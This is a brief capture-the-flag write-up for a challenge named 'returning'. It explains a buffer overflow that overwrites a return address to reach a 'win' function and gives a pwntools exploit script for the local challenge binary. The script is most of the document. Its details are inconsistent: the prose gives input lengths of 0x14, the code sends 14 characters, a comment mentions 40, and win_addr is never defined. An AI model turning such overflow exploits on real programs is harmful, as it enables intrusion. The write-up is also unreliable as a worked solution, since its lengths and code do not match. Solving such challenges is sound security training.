#returning:

this is simple bufferoverflow to point the return address to the win function.
ok we have to give two inputs maximum length of 0x14 so the inputs can be anything like "A"*0x14 and "B"*0x14 the total length of two inputs will be taken as the legth of the third input there it has the buffer overflow vulnerability and point the return address to win to get the flag



```py 
from pwn import *

p = process("./pwn")

p.sendline("y") # enable for taking the 1st input (saying yes)
p.send("A"*14) # the 1st input
p.sendline("y") # enable for taking the second inpuut(saying yes)
p.send("B"*14) # 2nd input
# --- These is inside the  for loop which exits after the round count is  2

p.send(p64(win_addr)*8) # 3rd input is where we will have buffer overflow takes (length of 1st input+length of second input) here 40 characters bufferoverflow call win function

p.recvall(timeout=1)
``` 